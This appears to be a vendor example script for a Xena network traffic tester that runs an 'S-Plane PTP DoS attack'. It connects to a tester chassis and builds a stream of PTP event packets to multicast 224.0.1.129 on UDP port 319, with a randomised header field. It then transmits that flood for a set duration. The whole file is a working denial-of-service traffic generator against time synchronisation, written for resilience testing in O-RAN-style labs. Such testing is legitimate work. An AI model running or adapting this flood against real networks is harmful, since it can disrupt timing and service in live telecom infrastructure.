################################################################
#
#                   S-PLANE PTP DOS ATTACK
#
# This script shows you how to do S-Plane PTP DoS attack
#
################################################################

import asyncio

from xoa_driver import testers
from xoa_driver import modules
from xoa_driver import ports
from xoa_driver import enums
from xoa_driver import utils
from xoa_driver.hlfuncs import mgmt, cli, headers
from xoa_driver.misc import Hex
import ipaddress
import logging

#---------------------------
# GLOBAL PARAMS
#---------------------------
CHASSIS_IP = "demo.xenanetworks.com"
USERNAME = "oran_dos"
PORT = "7/0"
XPC_MODE = True
DURATION = 10
XPC_FILENAME = "ptp_dos.xpc"

#---------------------------
# s_plane_ptp_dos
#---------------------------
async def s_plane_ptp_dos(chassis_ip: str, port_str: str, username: str, xpc_mode: bool, duration: int, xpc_filename: str):

    # configure basic logger
    logging.basicConfig(
        format="%(asctime)s  %(message)s",
        level=logging.DEBUG,
        handlers=[
            logging.FileHandler(filename="test.log", mode="a"),
            logging.StreamHandler()]
        )
    
    _mid = int(port_str.split("/")[0])
    _pid = int(port_str.split("/")[1])

    logging.info(f"#####################################################################")
    logging.info(f"Test:               S-Plane PTP DoS Attack")
    logging.info(f"Chassis:            {chassis_ip}")
    logging.info(f"Username:           {username}")
    logging.info(f"Port:               {port_str}")
    logging.info(f"XPC mode:           {xpc_mode}")
    logging.info(f"Test Duration:      {duration} sec")
    logging.info(f"#####################################################################")


    # Establish connection to a Valkyrie tester using Python context manager
    # The connection will be automatically terminated when it is out of the block
    logging.info(f"Connect to chassis")
    async with testers.L23Tester(host=chassis_ip, username=username, password="xena", port=22606, enable_logging=False) as tester:

        # Access module index 0 on the tester
        module = tester.modules.obtain(_mid)

        if isinstance(module, modules.ModuleChimera):
            return None # commands which used in this example are not supported by Chimera Module

        # Get the port on module
        port = module.ports.obtain(_pid)

        # Forcibly reserve the TX port and reset it.
        logging.info(f"Reserve port {port.kind.module_id}/{port.kind.port_id}")
        await mgmt.reserve_port(port, reset=True)
        
        await asyncio.sleep(2)

        if xpc_mode:
            # Configure port from .xpc file
            logging.info(f"Load {xpc_filename}")
            await cli.port_config_from_file(port, xpc_filename)
        else:
            logging.info(f"Configure port and stream")
            # Configure port using native python
            await port.max_header_length.set(max_header_length=256) # Port's max header length = 128
            stream = await port.streams.create() # create a stream on the port
            
            # Prepare packet header data
            eth = headers.Ethernet()
            eth.dst_mac = "0100.5e00.0181"
            eth.src_mac = "0030.051d.1e27"
            eth.ethertype = headers.EtherType.IPv4

            ipv4 = headers.IPV4()
            ipv4.src = "10.10.100.5"
            ipv4.dst = "224.0.1.129"
            ipv4.proto = headers.IPProtocol.UDP

            udp = headers.UDP()
            udp.src_port = 319
            udp.dst_port = 319
            udp.length = 132

            ptp = headers.PTP()
            
            await utils.apply(
                stream.comment.set(comment="S-Plane PTP DoS Attack"), # stream description
                stream.rate.fraction.set(stream_rate_ppm=100_000), # rate in ppm, 10%=100_000, 100%=1_000_000
                stream.burst.burstiness.set(size=0, density=100), # non-burst, burst size = 0, burst density = 100%
                stream.packet.header.protocol.set(segments=[
                    enums.ProtocolOption.ETHERNET, 
                    enums.ProtocolOption.IP,
                    enums.ProtocolOption.UDP,
                    enums.ProtocolOption.RAW_124]), # stream header, Ethernet | IPv4 | UDP | RAW86
                stream.packet.header.data.set(hex_data=Hex(str(eth)+str(ipv4)+str(udp)+str(ptp))),
                stream.packet.length.set(length_type=enums.LengthType.FIXED, min_val=170, max_val=170),
                stream.payload.content.set(payload_type=enums.PayloadType.INC8, hex_data=Hex("00")),
                stream.tpld_id.set(test_payload_identifier=-1),
                stream.insert_packets_checksum.set_on(),
                stream.enable.set_on()
            )
            
            await stream.packet.header.modifiers.configure(1) # create one modifier and configure
            mod0 = stream.packet.header.modifiers.obtain(0) # access the created modifier
            # configure the modifier
            # place the modifier on header position 6
            await mod0.specification.set(position=6, mask=Hex("FFFF0000"), action=enums.ModifierAction.RANDOM, repetition=1) 
            await mod0.range.set(min_val=0, step=1, max_val=65535)

        # start traffic
        logging.info(f"Start traffic")
        await port.traffic.state.set_start()
        # test duration
        for i in range(duration):
            logging.info(f"."*(i+1))
            await asyncio.sleep(1)
        # stop traffic
        logging.info(f"Stop traffic")
        await port.traffic.state.set_stop()
        await mgmt.release_port(port)

        logging.info(f"Done")

async def main():
    stop_event = asyncio.Event()
    try:
        await s_plane_ptp_dos(CHASSIS_IP, PORT, USERNAME, XPC_MODE, DURATION, XPC_FILENAME)
    except KeyboardInterrupt:
        stop_event.set()


if __name__ == "__main__":
    asyncio.run(main())
